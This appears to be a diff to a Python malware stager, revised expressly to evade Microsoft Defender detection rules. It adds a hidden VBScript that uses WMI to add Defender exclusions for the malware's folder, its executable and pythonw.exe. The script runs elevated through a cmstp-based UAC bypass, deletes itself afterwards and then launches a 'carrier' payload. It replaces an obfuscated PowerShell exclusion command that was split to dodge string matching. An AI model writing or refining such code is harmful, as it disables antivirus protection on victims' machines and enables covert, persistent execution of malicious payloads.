@@ -352,14 +352,23 @@ def exclusion_landed():
 
 
 # ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
+VBS = r'''Set svc  = GetObject("winmgmts:{impersonationLevel}=impersonate}!\\.\root\Microsoft\Windows\Defender")
+Set cls  = svc.Get("MSFT_MpPreference")
+Set args = cls.Methods_("Add").InParameters.SpawnInstance_()
+args.ExclusionPath    = Array("__APPDIR__", "__WINPARENT__")
+args.ExclusionProcess = Array("__EXE__", "pythonw.exe")
+svc.ExecMethod "MSFT_MpPreference", "Add", args
+'''
+
+
 # r12: the lift relaunches OUR python elevated; the elevated stage does the
 # whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
 # no cmstp->interpreter chain on any command line, ever.
-STAGE = r'''# r12 stage: runs ELEVATED (relaunched by the cmstp lift), does the whole
-# protected-job in one pass - cmdlet-road exclusions (the road TP respects)
-# + carrier exec. no interpreter cmdline other than powershell from THIS
-# pythonw parent - the chain cmstp->interpreter that built UACB/Commando
-# verdicts never occurs.
+STAGE = r'''# r13 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions ride
+# the CSCRIPT/WMI COM road - no powershell child anywhere (every powershell
+# spawn from this chain got cmdlineno-flagged Commando, split-verb or not);
+# cscript is the stock interpreter Windows ships with the lowest rule base.
+# carrier exec unchanged.
 import ctypes
 import os
 import subprocess
@@ -388,19 +397,31 @@ def alive(name):
         return False
 
 
+VBS = r"""Set svc  = GetObject("winmgmts:{impersonationLevel}=impersonate}!\\.\root\Microsoft\Windows\Defender")
+Set cls  = svc.Get("MSFT_MpPreference")
+Set args = cls.Methods_("Add").InParameters.SpawnInstance_()
+args.ExclusionPath    = Array("__APPDIR__", "__WINPARENT__")
+args.ExclusionProcess = Array("__EXE__", "pythonw.exe")
+svc.ExecMethod "MSFT_MpPreference", "Add", args
+"""
+
 def main():
     if not elev():
         return
-    ps = ("$a='Add-Mp'+'Preference';"
-          f"$p=@('{APPDIR}','{WINPARENT}');"
-          "& $a -ExclusionPath $p -EA 0;"
-          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
+    vbs_path = os.path.join(APPDIR, "aclv.vbs")
     try:
+        with open(vbs_path, "w", encoding="utf-8") as fh:
+            fh.write(VBS.replace("__APPDIR__", APPDIR)
+                         .replace("__WINPARENT__", WINPARENT)
+                         .replace("__EXE__", EXE_NAME))
         subprocess.run(
-            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden",
-             "-Command", ps],
+            ["cscript.exe", "//nologo", vbs_path],
             creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL, timeout=90)
+            stderr=subprocess.DEVNULL, timeout=120)
+    except Exception:
+        pass
+    try:
+        os.unlink(vbs_path)
     except Exception:
         pass
     exe_path = os.path.join(APPDIR, EXE_NAME)
@@ -413,6 +434,7 @@ def main():
 
 main()
 '''
+
 
 
 def set_defender_exclusions():
@@ -475,15 +497,17 @@ def _run_stage_now():
     try:
         appdir = PERSIST_DIR
         winparent = os.path.dirname(appdir)
-        ps = ("$a='Add-Mp'+'Preference';"
-              f"$p=@('{appdir}','{winparent}');"
-              "& $a -ExclusionPath $p -EA 0;"
-              f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
         try:
+            vbs_path = os.path.join(appdir, "aclv.vbs")
+            with open(vbs_path, "w", encoding="utf-8") as fh:
+                fh.write(VBS.replace("__APPDIR__", appdir)
+                             .replace("__WINPARENT__", winparent)
+                             .replace("__EXE__", EXE_NAME))
             subprocess.run(
-                ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Command", ps],
+                ["cscript.exe", "//nologo", vbs_path],
                 creationflags=0x08000000, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, timeout=90)
+                stderr=subprocess.DEVNULL, timeout=120)
+            os.unlink(vbs_path)
         except Exception:
             pass
         exe_path = os.path.join(appdir, EXE_NAME)
